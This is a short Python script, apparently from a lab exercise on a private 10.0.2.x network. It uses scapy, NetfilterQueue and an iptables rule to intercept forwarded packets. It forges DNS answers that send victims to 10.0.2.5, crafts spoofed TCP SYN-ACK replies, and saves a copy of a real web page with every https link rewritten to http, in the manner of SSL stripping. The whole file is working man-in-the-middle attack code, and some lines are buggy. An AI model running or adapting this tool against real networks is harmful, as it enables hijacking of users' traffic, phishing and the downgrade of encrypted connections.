from scapy.all import * 
import random
import requests
from netfilterqueue import NetfilterQueue
import os
# regex library 
import re
GOOGLE_IP = "142.250.179.132"

response = requests.get("https://abv.bg").text
response = re.sub(r"https", "http", response) #replace all occurences of https with http
with open("google.html", "w") as f:
    f.write(response.encode("utf-8").strip()) #strip() removes empty spaces


def processPkt(packet):
    scapyPkt = IP(packet.get_payload()) # make it scapy packet
    if scapyPkt.haslayer(DNSRR):
        try:
            scapyPkt = modifyPkt(scapyPkt)
            packet.set_payload(bytes(scapyPkt))
        except IndexError:
            print("Error")
            pass
    if scapyPkt.haslayer(TCP) and scapyPkt[TCP].flags == "S": #always assume that the always DNS request before making handshake
        # craft a response pkt to M1
        ip = IP(src ="10.0.2.5", dst = "10.0.2.4")  
        tcpSYNACK = TCP(sport = 8081, dport = scapyPkt[TCP].sport, flags ="SA", seq = 1000, ack = scapyPkt.seq + 1) 
        pktACK = sr1(ip/tcpSYNACK)
        packet.set_payload(bytes(pktACK))

    packet.accept()

def modifyPkt(packet):
    packet[DNS].an = DNSRR( rdata="10.0.2.5")#rrname = b"www.google.com",
    packet[DNS].ancount = 1 #answer count

    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len    
    del packet[UDP].chksum

    print("return DNS response")

    return packet

queueNum = 0
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queueNum))


queue = NetfilterQueue()
#iptable is a firewall rules
try:
    queue.bind(queueNum, processPkt)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
